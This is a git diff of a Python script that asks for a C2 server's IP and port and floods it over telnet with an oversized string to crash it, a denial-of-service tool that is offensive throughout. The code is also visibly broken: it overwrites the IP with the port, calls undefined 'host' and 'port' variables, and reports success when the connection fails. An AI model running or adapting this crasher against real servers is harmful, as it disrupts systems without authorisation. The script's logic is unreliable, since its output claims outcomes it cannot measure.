@@ -9,7 +9,6 @@ import telnetlib
 import random
 import socket
 from colorama import Fore
-from threading import Thread
 
 intro = f"""
 {Fore.RED}███╗   ███╗ ██████╗ █████╗
@@ -27,24 +26,22 @@ print(intro)
 c2ip = input(("C2 IP: "))
 c2ip = str(c2ip)
 c2port = input(("C2 Port: "))
-c2ip = str(c2port)
+c2ip = int(c2port)
 payload = "void"+"d"*9999
 timeout = 3
 somesock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-tn = telnetlib.Telnet()
 
-def crash(crasher):
-	tn.open(crasher, c2port, timeout)
-	tn.write(payload)
-
-for crasher in c2ip:
-	crasher.replace("https://", "")
-	crasher.replace("http://", "")
-	crasher.replace("/", "")
-	crasher2 = Thread(target=crash, args=(c2ip,))
-	crasher2.start()
-	result = somesock.connect_ex(c2ip,c2port)
-	if result == 0:
-		print(Fore.GREEN+"C2 has been successfully crashed!")
-	else:
-		print(Fore.RED+"did not connect, did you put the C2 IP correctly?")
+try:
+    with telnetlib.Telnet(host, port, timeout) as session:
+        session.write("{}".format(payload).encode('utf-8'))
+        session.write("{}".format(payload).encode('utf-8'))
+        print("Payload sent!")
+except Exception:
+    try:
+        result = somesock.connect_ex(c2ip, c2port)
+        if result == 0:
+            print("the C2 could not be crashed sucessfully.")
+        else:
+            print("The C2 was crashed successfully.")
+    except:
+        print("Could not connect, are you sure you put in the IP and port correctly?")
